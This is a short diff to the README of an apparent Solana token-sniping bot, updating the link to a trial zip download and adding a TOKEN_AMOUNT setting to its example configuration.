@@ -60,7 +60,7 @@ src/
 ```
 ---
 ## Trial Version
-🗂️ [solana-raypump-sniper(trial).zip](https://github.com/user-attachments/files/18754518/solana-raypump-sniper.trial.zip)
+🗂️ [solana-raypump-sniper(trial).zip](https://github.com/user-attachments/files/18796920/solana-raypump-sniper.trial.zip)
 
 ### Trading Strategy
 
@@ -87,6 +87,7 @@ JITO_TIP_VALUE=0.004
 BUY_THRESHOLD=1000
 SELL_THRESHOLD=300
 TIME_EXCEED=60
+TOKEN_AMOUNT=0.000001
 ```
 2. Add the wallet address you want to block on a new line and save the file.
 ```
